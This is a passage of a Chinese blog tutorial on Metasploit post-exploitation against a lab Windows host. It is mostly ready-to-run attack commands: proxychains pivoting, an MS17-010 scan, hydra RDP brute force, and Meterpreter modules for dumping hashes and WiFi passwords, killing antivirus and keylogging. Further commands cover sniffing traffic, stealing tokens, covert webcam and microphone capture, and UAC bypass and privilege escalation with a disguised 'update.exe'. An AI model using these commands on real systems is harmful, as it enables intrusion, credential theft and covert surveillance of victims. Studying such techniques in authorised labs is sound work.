&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306170840980.png&#34; alt=&#34;image-20210306170840980&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 vim /etc/proxychains.conf ，在文件末尾添加 socks4 代理服务器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306170930216.png&#34; alt=&#34;image-20210306170930216&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 proxychains 代理访问执行 nmap 操作&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;proxychains nmap -sV -p 445 --script=smb-vuln-ms17-010.nse 192.168.183.146 # 扫描永恒之蓝漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains hydra 192.168.183.146 rdp -l administrator -P password.txt -V # rdp 服务暴力破解&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306171108261.png&#34; alt=&#34;image-20210306171108261&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306171139549.png&#34; alt=&#34;image-20210306171139549&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h2&gt;
&lt;p&gt;常用脚本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run arp_scanner -r 192.168.183.1/24 # 利用 arp 进行存活主机扫描&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run winenum # 自动化执行一些检测脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run credcollect # 获取用户 hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run domain_list_gen # 获取域管理账户列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/gather/env # 获取用户环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_logged_on_users -c # 列出当前登录用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/linux/gather/checkvm # 是否虚拟机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/checkvm # 是否虚拟机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/forensics/enum_drives # 查看存储器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_applications # 获取安装软件信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/dumplinks # 获取最近访问过的文档、链接信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_ie # 获取 IE 缓存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_firefox # 获取 firefox 缓存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_chrome # 获取 Chrome 缓存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/recon/local_exploit_suggester # 获取本地提权漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_patches # 获取补丁信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_domain # 查找域控&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_snmp # 获取 snmp 团体名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/credentials/vnc # 获取 vnc 密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/wlan/wlan_profile # 用于读取目标主机 WiFi 密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/gather/wlan_geolocate # 基于 wlan 进行地理位置确认 文件位于/root/.msf4/loot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/manage/killav 关闭杀毒软件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306171454981.png&#34; alt=&#34;image-20210306171454981&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306171504647.png&#34; alt=&#34;image-20210306171504647&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306171918329.png&#34; alt=&#34;image-20210306171918329&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306172108912.png&#34; alt=&#34;image-20210306172108912&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;常用的破解模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用的破解模块&#34;&gt;#&lt;/a&gt; 常用的破解模块&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/mssql/mssql_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/ftp/ftp_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/ssh/ssh_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/telnet/telnet_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/smb/smb_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/mssql/mssql_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/mysql/mysql_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/oracle/oracle_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/postgres/postgres_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/vnc/vnc_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/pcanywhere/pcanywhere_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/snmp/snmp_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auxiliary/scanner/ftp/anonymous&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;键盘记录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#键盘记录&#34;&gt;#&lt;/a&gt; 键盘记录&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;keyscan_start # 开始键盘记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyscan_dump # 导出记录数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keyscan_stop # 结束键盘记录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306172219342.png&#34; alt=&#34;image-20210306172219342&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;sniffer-抓包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sniffer-抓包&#34;&gt;#&lt;/a&gt; sniffer 抓包&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use sniffer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_interfaces # 查看网卡&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_start 1 # 选择网卡 1 开始抓包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_stats 1 # 查看网卡 1 状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_dump 1 /tmp/wlan1.pcap # 导出 pcap 数据包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_stop 1 # 停止网卡 1 抓包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sniffer_release 1 # 释放网卡 1 流量&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;窃取令牌&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#窃取令牌&#34;&gt;#&lt;/a&gt; 窃取令牌&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306172412924.png&#34; alt=&#34;image-20210306172412924&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;steal_token &amp;lt;pid 值&amp;gt; # 从指定进程中窃取 token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drop_token # 停止假冒当前的 token&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306172447283.png&#34; alt=&#34;image-20210306172447283&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;网络摄像头&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络摄像头&#34;&gt;#&lt;/a&gt; 网络摄像头&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;record_mic # 音频录制&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;webcam_chat # 开启视频聊天(对方有弹窗）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;webcam_list # 查看摄像头&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;webcam_snap # 通过摄像头拍照&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;webcam_stream # 通过摄像头开启视频监控(以网页形式进行监控≈直播）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;截屏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#截屏&#34;&gt;#&lt;/a&gt; 截屏&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;截屏&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;screenshot # 截屏&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use espia # 使用 espia 模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;screengrab # 截屏&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h2&gt;
&lt;p&gt;getsystem 提权&lt;br&gt;
利用 getsystem 命令提权，该命令会自动寻找各种可能的提权技术来使得用户将权限提升到更高的级别。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;getsystem 提权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getuid 查看已获得权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;enum_patches-模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#enum_patches-模块&#34;&gt;#&lt;/a&gt; enum_patches 模块&lt;/h3&gt;
&lt;p&gt;利用 enum_patches 模块搜集补丁信息，然后寻找可利用的 exploits 进行提权。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/enum_patches #查看补丁信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;background&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search MS10-015&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/ms10_015_kitrap0d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set session 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306172904051.png&#34; alt=&#34;image-20210306172904051&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过-uac-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-uac-提权&#34;&gt;#&lt;/a&gt; 绕过 UAC 提权&lt;/h3&gt;
&lt;p&gt;msf 内置一些 bypassuac 脚本，原理不同，使用方法类似，执行后返回一个新的会话，再次执行 getsystem 即可提权&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac_eventvwr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac_injection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac_injection_winsxs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac_silentcleanup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit/windows/local/bypassuac_vbs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用命令 getsystem 提权失败，然后利用 bypassuac 来提权，这里利用 exploit/windows/local/bypassuac 模块 (32 位、64 位都有效)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/bypassuac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set session 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173046136.png&#34; alt=&#34;image-20210306173046136&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用-runas-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用-runas-提权&#34;&gt;#&lt;/a&gt; 使用 RunAs 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;该方法利用 exploit/windows/local/ask 模块(32 位、64 位都有效)，创建一个可执行文件并在目标机上发起一个提升权限请求的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;程序，触发系统 UAC，提示用户是否要继续，如果用户选择“是”，则会返回一个高权限的 meterpreter shell。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/ask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set filename update.exe # 设置反弹程序名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set session 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入 run 命令以后会在目标机上弹出 UAC，提示用户是否允许，选择是就会返回一个高权限的 meterpreter shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173138736.png&#34; alt=&#34;image-20210306173138736&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意事项：&lt;br&gt;
使用 RunAs 模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序 UAC 设置则没有要求。&lt;br&gt;
使用 RunAs 模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用 EXE::Custom 选项。&lt;/p&gt;
&lt;h3 id=&#34;假冒令牌提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#假冒令牌提权&#34;&gt;#&lt;/a&gt; 假冒令牌提权&lt;/h3&gt;
&lt;p&gt;令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。一般有两种类型的令牌，一种是 Delegation Tokens，也就是授权令牌，它支持交互式登录（例如远程桌面登陆登录）。还有一种是 Impersonation Tokens，也就是模拟令牌，它是非交互的会话（例如访问文件共享）。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use incognito # 加载窃取令牌模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -u # 查看可用的用户令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -g # 查看可用的用户组令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;impersonate_token &amp;#x27;NT AUTHORITY\SYSTEM&amp;#x27; # 假冒 SYSTEM token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rev2self #返回原始 token&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306173332626.png&#34; alt=&#34;image-20210306173332626&#34;&gt;&lt;/p&gt;
